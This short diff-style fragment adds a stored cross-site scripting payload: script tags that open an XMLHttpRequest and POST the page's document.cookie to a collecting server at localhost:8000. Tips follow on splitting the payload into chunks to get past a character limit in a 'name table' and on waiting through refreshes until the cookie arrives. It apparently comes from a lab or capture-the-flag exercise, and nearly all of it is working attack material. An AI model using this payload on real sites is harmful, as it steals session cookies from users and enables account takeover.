@@ -1,0 +1,6 @@
+<SCRIPT>var xhr = new XMLHttpRequest(); xhr.open("POST", "http://localhost:8000", true);</SCRIPT>
+<SCRIPT>xhr.send(document.cookie);</SCRIPT>
+
+I think there is a character limit on the name table, you can't send an indefinite stream of characters, you need to break it down into chunks
+
+Just be patient, the cookie comes on it's own after a few refreshes/page navigations.
